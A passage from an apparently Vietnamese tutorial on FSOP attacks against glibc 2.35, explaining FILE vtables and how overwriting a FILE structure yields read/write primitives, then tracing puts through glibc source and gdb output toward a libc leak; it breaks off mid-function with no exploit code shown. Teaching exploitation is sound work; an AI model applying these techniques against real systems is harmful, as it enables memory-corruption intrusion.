<p><em>Gán vtable vào FILE structure</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">_IO_JUMPS</span> (<span style="color:#f92672">&amp;</span>new_f<span style="color:#f92672">-&gt;</span>fp) <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_IO_file_jumps;
</span></span></code></pre></div><p><code>_IO_file_jumps</code> là bảng 1 trong nhiều<code>vtable</code> đã tồn tại trong chương trình. Khởi tạo <code>vtable</code> với <code>_IO_file_jumps</code> khi mở file.
Làm sao để gọi hàm đó ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>_IO_finish_t) (_IO_FILE <span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>);
</span></span></code></pre></div><p>Khi thực hiện <code>_IO_FINISH(FP)</code>, nó sẽ gọi đến hàm được lưu trong <code>vtable</code> của <code>FILE</code> được truyền vào, với chỉ mục kiểu <code>int</code> là vị trí của hàm <code>_IO_finish_t</code> trong bảng <code>vtable</code>.</p>
<p>Hmm, mình đã khái quát xong.
Tóm gọn lại, nếu chúng ta có thể ghi đè 1 file structure nào đó, thì ta có thể điều khiển được nơi mà chúng ta có thể ghi, đọc -&gt; READ/WRITE PRIMITIVE . Điều đó khá là dễ dàng nhưng chúng ta cần chú ý các điều kiện.</p>
<p>Vậy mình đặt câu hỏi trong đầu: <code>Liệu có thể điều khiển được luồng thực thi sang hướng khác nếu như mình có thể ghi đè phân vùng vtable không ?</code></p>
<p>Mình sẽ nói rõ hơn phần đó trong phần cuối cùng !</p>
<h3 id="3-leak-libc-via-_io_file-read-primitive">3. LEAK LIBC VIA _IO_FILE (READ PRIMITIVE)</h3>
<p>Làm sao chúng ta có thể leak được địa chỉ của libc thông qua FSOP attack ?</p>
<p>Trước hết, tìm hiểu cách hoạt động của hàm <code>puts</code> trong C (glibc-2.35).</p>
<p>Chương trình đơn giản sau thực hiện việc in chuỗi ra thiết bị xuất chuẩn</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;FSOP ATTACK&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình setup source code và compile với <code>glibc-2.35</code> bằng câu lệnh sau</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> wget https:<span style="color:#75715e">//ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gz
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$</span> tar <span style="color:#f92672">-</span>xvf glibc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.tar.gz
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> run binary in gdb
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> dir glibc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span><span style="color:#f92672">/</span>libio<span style="color:#f92672">/</span>
</span></span></code></pre></div><p>Sau khi load source code vào chúng ta có thể dễ dàng debug hơn với code C.</p>
<p>Debug binary bằng gdb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disassemble main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001149</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     endbr64
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000114d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;:</span>     push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000114e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;:</span>     mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001151</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;:</span>     lea    rax,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xeac</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x2004</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001158</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;:</span>    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000000115b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x1050</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001160</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;:</span>    mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001165</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;:</span>    pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000001166</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;:</span>    ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p>Mình đặt breakpoints tại hàm chỗ gọi đên hàm <code>puts@plt</code> để xem nó làm gì.</p>
<p>Rõ ràng, nó gọi đến hàm <code>_IO_puts</code> trong thư viện
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31">_IO_puts</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_puts</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span> (str);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_acquire_lock</span> (stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">_IO_vtable_offset</span> (stdout) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> <span style="color:#a6e22e">_IO_fwide</span> (stdout, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_IO_sputn</span> (stdout, str, len) <span style="color:#f92672">==</span> len
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_IO_putc_unlocked</span> (<span style="color:#e6db74">&#39;\n&#39;</span>, stdout) <span style="color:#f92672">!=</span> EOF)
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">MIN</span> (INT_MAX, len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_release_lock</span> (stdout);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">weak_alias</span> (_IO_puts, puts)
</span></span></code></pre></div><p>Ta thấy trong source và assembly, tiếp tục gọi đến <code>_IO_sputn</code>.
Sau 1 hồi tìm kiếm thì mình biết là <code>_IO_sputn</code> là alias tới <code>_IO_XSPUTN (__fp, __s, __n)</code> qua dòng code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
</span></span></span></code></pre></div><p>Đơn giản là nó jump thẳng tới con trỏ hàm trong <code>__xsputn</code> với vtable là của <code>stdout</code> FP.</p>
<pre tabindex="0"><code>#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
</code></pre><p>Kiểm tra vtable của <code>stdout</code> trong gdb, ta thấy <code>__xsputn</code> trỏ đến <code>_IO_new_file_xsputn</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> print _IO_file_jumps
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  __dummy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  __dummy2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  __finish <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86060</span> <span style="color:#f92672">&lt;</span>_IO_new_file_finish<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __overflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86e60</span> <span style="color:#f92672">&lt;</span>_IO_new_file_overflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __underflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c86af0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_underflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __uflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c88100</span> <span style="color:#f92672">&lt;</span>__GI__IO_default_uflow<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __pbackfail <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c898c0</span> <span style="color:#f92672">&lt;</span>__GI__IO_default_pbackfail<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __xsputn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c856b0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_xsputn<span style="color:#f92672">&gt;</span>             <span style="color:#960050;background-color:#1e0010">#</span> target
</span></span><span style="display:flex;"><span>  __xsgetn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c85340</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_xsgetn<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seekoff <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c849a0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_seekoff<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seekpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c88840</span> <span style="color:#f92672">&lt;</span>_IO_default_seekpos<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __setbuf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84650</span> <span style="color:#f92672">&lt;</span>_IO_new_file_setbuf<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __sync <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c844e0</span> <span style="color:#f92672">&lt;</span>_IO_new_file_sync<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __doallocate <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c78060</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_doallocate<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c859d0</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_read<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __write <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84f80</span> <span style="color:#f92672">&lt;</span>_IO_new_file_write<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __seek <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84720</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_seek<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __close <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84640</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_close<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __stat <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c84f70</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_stat<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __showmanyc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c89a40</span> <span style="color:#f92672">&lt;</span>_IO_default_showmanyc<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>  __imbue <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c89a50</span> <span style="color:#f92672">&lt;</span>_IO_default_imbue<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vậy ta cùng xem source hàm <code>_IO_new_file_xsputn</code>
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1196">_IO_new_file_xsputn</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_new_file_xsputn</span> (FILE <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> n)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) data;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> to_do <span style="color:#f92672">=</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> must_flush <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* This is an optimized implementation.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     If the amount to be written straddles a block boundary
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     (or the filebuf is unbuffered), use sys_write directly. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* First figure out how much space is available in the buffer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_LINE_BUF) <span style="color:#f92672">&amp;&amp;</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      count <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;=</span> n)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (p <span style="color:#f92672">=</span> s <span style="color:#f92672">+</span> n; p <span style="color:#f92672">&gt;</span> s; )
</span></span><span style="display:flex;"><span>	    {
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*--</span>p <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		  count <span style="color:#f92672">=</span> p <span style="color:#f92672">-</span> s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		  must_flush <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		  <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	    }
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">&gt;</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr)
</span></span><span style="display:flex;"><span>    count <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr; <span style="color:#75715e">/* Space available. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Then fill the buffer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> to_do)
</span></span><span style="display:flex;"><span>	count <span style="color:#f92672">=</span> to_do;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">__mempcpy</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_ptr, s, count);
</span></span><span style="display:flex;"><span>      s <span style="color:#f92672">+=</span> count;
</span></span><span style="display:flex;"><span>      to_do <span style="color:#f92672">-=</span> count;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (to_do <span style="color:#f92672">+</span> must_flush <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">size_t</span> block_size, do_write;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Next flush the (full) buffer. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_OVERFLOW</span> (f, EOF) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* If nothing else has to be written we must not signal the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	   caller that everything has been written.  */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> to_do <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> EOF : n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Try to maintain alignment: write a whole number of blocks.  */</span>
</span></span><span style="display:flex;"><span>      block_size <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      do_write <span style="color:#f92672">=</span> to_do <span style="color:#f92672">-</span> (block_size <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">?</span> to_do <span style="color:#f92672">%</span> block_size : <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (do_write)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_do_write</span> (f, s, do_write);
</span></span><span style="display:flex;"><span>	  to_do <span style="color:#f92672">-=</span> count;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&lt;</span> do_write)
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Now write out the remainder.  Normally, this will fit in the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 buffer, but it&#39;s somewhat messier for line-buffered files,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 so we let _IO_default_xsputn handle the general case. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (to_do)
</span></span><span style="display:flex;"><span>	to_do <span style="color:#f92672">-=</span> <span style="color:#a6e22e">_IO_default_xsputn</span> (f, s<span style="color:#f92672">+</span>do_write, to_do);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_hidden_ver</span> (_IO_new_file_xsputn, _IO_file_xsputn)
</span></span></code></pre></div><p>Trước khi gọi đến hàm <code>new_do_write()</code>, ta để ý ở trên gọi đến <code>_IO_OVERFLOW()</code>.</p>
<p>Vào hàm <code>_IO_OVERFLOW()</code> thì trong vtable của <code>stdout</code>, nó gọi đến hàm <code>_IO_new_file_overflow()</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L730">_IO_new_file_overflow</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_new_file_overflow</span> (FILE <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">int</span> ch)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_NO_WRITES) <span style="color:#75715e">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__set_errno</span> (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* If currently reading or no buffer allocated. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_doallocbuf</span> (f);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_setg</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Otherwise must be currently reading.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 logically slide the buffer forwards one block (by setting the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 read pointers to all point at the beginning of the block).  This
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 makes room for subsequent output.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 Otherwise, set the read pointers to _IO_read_end (leaving that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 alone, so it can continue to correspond to the external position). */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (<span style="color:#a6e22e">_IO_in_backup</span> (f)))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">size_t</span> nbackup <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_free_backup_area</span> (f);
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">-=</span> <span style="color:#a6e22e">MIN</span> (nbackup,
</span></span><span style="display:flex;"><span>				   f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_base;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end)
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end;
